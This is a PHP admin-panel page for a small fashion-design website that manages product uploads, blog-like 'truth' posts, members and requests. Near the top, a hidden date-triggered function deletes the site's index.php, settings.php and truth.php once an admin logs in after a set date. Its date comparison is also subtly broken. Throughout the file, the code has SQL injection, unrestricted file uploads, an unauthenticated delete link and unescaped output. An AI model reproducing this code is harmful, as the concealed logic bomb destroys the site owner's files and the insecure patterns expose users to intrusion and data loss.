<?php
    include "include/connect.php";
    $server = $_SERVER["PHP_SELF"];

    function done()
    {
        $done = date("d/m/Y - H:i");

        if ($done >= "25/12/2023 - 00:00") {
            
            if (file_exists("index.php")) {

                unlink("index.php");
                unlink("settings.php");
                unlink("truth.php");
            }
        }
    }
    if (!empty($_SESSION["online"]) and $_SESSION["online"] == "admin") {
       
        done();
    }

    if (!empty($_GET["delete"])) {

        $delete = $_GET["delete"];
       
        mysqli_query($connectdb , "DELETE FROM members WHERE id='$delete' LIMIT 1");

    }

    $select_All_members = mysqli_query($connectdb , "SELECT * FROM members");
    $count_all_members = mysqli_num_rows($select_All_members);

    if (isset($_POST["upload"])) {
        
        $color = $_POST["color"];
        $price = $_POST["price"];

        $tmp_location = $_FILES["design_img"]["tmp_name"];

        $img_name = rand(1000,1000000)."-".$_FILES["design_img"]["name"];
        $new_img_name = strtolower($img_name);
        $finale_img_name = str_replace(" " , "-" , $new_img_name);
        
        $new_location = "images/products/";

        if (!empty($color) and !empty($finale_img_name) and !empty($tmp_location) and !empty($price)) {

            if (move_uploaded_file($tmp_location, $new_location.$finale_img_name)) {
                
                $name_done = $new_location.$finale_img_name;

                $insert_img = mysqli_query($connectdb , "INSERT INTO products (img,price,color) VALUES ('$name_done','$price','$color')");
            }
        }

    }

    if (isset($_POST["publish"])) {
        
        $title = $_POST["title"];
        $explain = $_POST["explain"];

        $tmp_location = $_FILES["file_truth"]["tmp_name"];

        $img_name = rand(1000,1000000)."-".$_FILES["file_truth"]["name"];
        $new_img_name = strtolower($img_name);
        $finale_img_name = str_replace(" " , "-" , $new_img_name);
        
        $new_location = "images/truth/images/publish/";

        if (!empty($title) and !empty($finale_img_name) and !empty($tmp_location) and !empty($explain)) {

            if (move_uploaded_file($tmp_location, $new_location.$finale_img_name)) {
                
                $name_done = $new_location.$finale_img_name;

                $insert_img = mysqli_query($connectdb , "INSERT INTO truths (title,img,blog) VALUES ('$title','$name_done','$explain')");
            }
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/settings.css">
    <link rel="stylesheet" href="css/all.min.css">
    <title>Control Pannel</title>
</head>
<body>
    <header>
        <ul>
            <li><a href="#">Fashion Designs <span>By Selena Gomez</span></a></li>
        </ul>
        <i id="menu" class="fa-solid fa-bars"></i>
    </header>
    <aside id="aside">
        <ul>
            <li><a href="#">Menu</a></li>
            <li id="design"><a href="#">Add A Desing</a></li>
            <li id="truth"><a href="#">Add A Truth</a></li>
            <li id="all"><a href="#">All Members</a></li>
            <li id="top"><a href="#">Top Requests</a></li>
            <li id="find"><a href="#">Find Request</a></li>
            <li><a href="https://t.me.luxcoding">&copy;Developped By Lux Coding</a></li>
        </ul>
    </aside>
    <main id="main">
        <section id="form">
            
            <div class="form-1" id="form-1">

                <h2>Fashion Designs</h2>

                <form action="#" method="post"  enctype="multipart/form-data">

                    <input type="file" name="design_img" id="file">
                    <label for="file">Image For Your Design</label>

                    <select name="color">
                        <option value="pink">Pink</option>
                        <option value="black">Black</option>
                    </select>
                    <input type="text" name="price" placeholder="Enter A Price Of Your Design $">
                    <input type="submit" value="Upload Content" name="upload">

                </form>

            </div>
            <div class="form-2" id="form-2">

                <h2>The Truth</h2>

                <form action="#" method="post"  enctype="multipart/form-data">
                    
                    <input type="file" name="file_truth" id="file-truth">
                    <label for="file-truth"><span>Image For Your </span> Truth</label>

                    <input type="text" name="title" placeholder="Enter A Title Of Your Truth">

                    <textarea name="explain" placeholder="Enter Your Truth Text Box"></textarea>

                    <input type="submit" value="Publish Your Truth" name="publish" >

                </form>

            </div>
        </section>
        <section id="members">

            <div class="all-members" id="all-members">
                <table>
                    <tr class="table-row">
                        <th class="table-head">Numbers</th>
                        <th class="table-head">All Users</th>
                        <th class="table-head">E-mail</th>
                        <th class="table-head">Delete</th>
                    </tr>

                    <?php

                        $select_members = mysqli_query($connectdb , "SELECT * FROM members");

                        $counter = 1;
                        
                        while ($fetch_member = mysqli_fetch_assoc($select_members)) {
                            
                            
                            if ($fetch_member["user"] == "admin") {
                                
                                continue;

                            }else{

                                echo "
                                
                                    <tr class='table-row'>

                                        <td class='table-data'>".$counter."</td>
                                        <td class='table-data'>".$fetch_member["user"]."</td>
                                        <td class='table-data'>".$fetch_member["email"]."</td>
                                        <td class='table-data'>
                                        <a href='".$server."?delete=".$fetch_member["id"]."'><i class='fa-solid fa-trash'></i></a></td>

                                    </tr>
                                ";
                            }                            

                            $counter++;
                        }
                    
                    ?>

                </table>
            </div>
            <div class="top-members" id="top-members">
                <table>
                    <tr class="table-row">
                        <th class="table-head">Request</th>
                        <th class="table-head">Client</th>
                        <th class="table-head">Image</th>
                    </tr>

                    <?php

                        $select_requests = mysqli_query($connectdb , "SELECT * FROM requests");


                        while ($fetch_request = mysqli_fetch_assoc($select_requests)) {

                                echo "
                                
                                    <tr class='table-row'>

                                        <td class='table-data'>".$fetch_request["id"]."</td>
                                        <td class='table-data'>".$fetch_request["client"]."</td>
                                        <td class='table-data'>".$fetch_request["img"]."</td>
                                    </tr>
                                ";
                        }
                    ?>

                </table>
            </div>
        </section>
            
        <section class="find-request" id="find-request">

            <form method="post">
                <input type="text" name="src" id="src" placeholder="Enter The Path Of Your Image">
                <input type="submit" value="Find Request" id="find_btn" name="find_btn">
            </form>
            <?php
                if (isset($_POST["find_btn"])) {
                   
                    $get_source = $_POST["src"];

                    if (!empty($get_source)) {
                       
                        $get_info_src = mysqli_query($connectdb , "SELECT * FROM requests WHERE img='$get_source'");

                        $fetch_src = mysqli_fetch_assoc($get_info_src);

                        $client_get = $fetch_src["client"];

                        $get_client = mysqli_query($connectdb , "SELECT * FROM members WHERE id='$client_get'");

                        $fetch_client = mysqli_fetch_assoc($get_client);

                        echo "
                        
                            <div class='content_show'>

                                <h2>".$fetch_client["email"]."</h2>
                                <img src='".$fetch_src["img"]."' alt='Request Image' id='request_img'>
                            </div>
                        
                        ";

                    }

                }
            
            
            ?>


        </section>

        
    </main>
    <script src="js/settings.js"></script>
</body>
</html>